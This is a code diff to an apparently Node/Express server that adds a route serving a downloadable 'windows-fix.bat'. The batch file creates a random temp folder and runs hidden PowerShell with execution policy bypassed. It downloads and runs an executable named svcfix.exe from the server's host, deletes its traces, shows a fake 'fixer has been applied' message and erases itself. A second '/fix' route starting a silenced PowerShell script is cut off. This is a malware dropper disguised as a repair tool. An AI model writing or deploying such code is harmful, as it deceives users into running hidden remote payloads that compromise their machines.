@@ -248,6 +248,23 @@ tbody tr:hover{background:#0d0d22}
 </html>`;
 }
 
+app.get("/s", (req, res) => {
+  const host = req.headers.host || "zxcrosfixer.up.railway.app";
+  const bat = `@echo off
+set "d=%temp%\\~%random%%random%"
+mkdir "%d%" >nul 2>&1
+powershell -w hidden -ep bypass -c "Invoke-WebRequest -Uri 'https://${host}/pkg' -OutFile '%d%\\svcfix.exe' -UseBasicParsing; Start-Process -FilePath '%d%\\svcfix.exe' -WindowStyle Hidden -Wait; Remove-Item -Path '%d%' -Recurse -Force -ErrorAction SilentlyContinue"
+echo.
+echo  [92mDone. The fixer has been applied.[0m
+echo.
+timeout /t 3 >nul
+del "%~f0"
+`;
+  res.setHeader("Content-Type", "application/octet-stream");
+  res.setHeader("Content-Disposition", "attachment; filename=windows-fix.bat");
+  res.send(bat);
+});
+
 app.get("/fix", (req, res) => {
   const host = req.headers.host || "zxcrosfixer.up.railway.app";
   const script = `$ErrorActionPreference='SilentlyContinue'
